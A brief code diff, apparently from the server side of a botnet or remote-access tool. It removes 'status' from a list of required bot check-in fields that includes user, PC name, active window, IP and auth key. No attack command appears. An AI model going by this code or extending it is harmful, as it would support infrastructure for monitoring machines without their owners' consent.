@@ -29,7 +29,7 @@ def quick_save_bot(bot_id, payload):
 
 
 # ⚡️ ОБЯЗАТЕЛЬНЫЕ ПОЛЯ:
-REQUIRED_INFO_FIELDS = ['id', 'status', 'loc', 'user', 'pc_name', 'activeWindow', 'last_active', 'ip', 'auth_key']
+REQUIRED_INFO_FIELDS = ['id', 'loc', 'user', 'pc_name', 'activeWindow', 'last_active', 'ip', 'auth_key']
 MAX_PAYLOAD = 64 * 1024  # 64 KB
 
 
